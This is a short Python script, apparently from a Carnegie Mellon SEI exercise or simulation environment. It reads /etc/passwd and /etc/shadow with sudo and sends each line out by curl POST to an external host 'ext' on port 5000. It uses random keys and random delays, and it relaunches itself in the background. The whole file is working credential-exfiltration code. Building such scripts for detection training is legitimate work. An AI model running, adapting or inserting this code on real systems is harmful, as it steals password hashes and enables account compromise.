#!/usr/bin/python3

# Copyright 2023 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

from fileinput import filename
import os,sys,subprocess, time, random

def upload():
    out = subprocess.run("sudo cat /etc/passwd /etc/shadow",shell=True,capture_output=True).stdout.decode('utf-8')
    outList = out.split('\n')
    if '' in outList:
        outList.remove('')
    index = 0
    while index < len(outList):
        data = outList[index]
        keyLength = random.randint(16,30)
        tmpKey = ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(keyLength))
        revTmpKey = ''.join(list(reversed(tmpKey)))
        key = tmpKey + revTmpKey
        cmd = 'curl -X POST http://ext:5000 -m 5 -H "Content-Type:application/json" -d \'{{"key":"{}","data":"{}"}}\''.format(key,data)
        status = subprocess.run(cmd, shell=True, capture_output=True).stdout.decode('utf-8')
        if key in status:
            index +=1
            time.sleep(random.randint(2,7))

if __name__ == '__main__':
    tmpPath = os.path.abspath(sys.argv[0])
    index = tmpPath.rfind('/')
    dir = tmpPath[:index+1]
    fileName = tmpPath[index+1:].replace('.py','')
    cmd = f"python3 -c 'import sys;sys.path.insert(0,\"{dir}\"); import {fileName}; {fileName}.upload()' &"
    subprocess.run(cmd,shell=True)
